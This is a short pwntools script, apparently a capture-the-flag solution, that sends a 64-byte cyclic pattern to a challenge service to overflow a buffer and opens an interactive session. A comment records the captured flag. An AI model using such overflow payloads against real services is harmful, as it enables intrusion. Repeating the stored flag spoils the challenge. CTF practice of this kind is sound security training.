from pwn import *
p = remote('ctf.mf.grsu.by', 9024)

print(p.recvuntil(b':'))

answer = cyclic(64)
p.sendline(answer)

p.interactive()
# grodno{9b0dc0S3gfaults_4re_a_gr3at_fr1end_0f_h4ck3r5cf6cbd}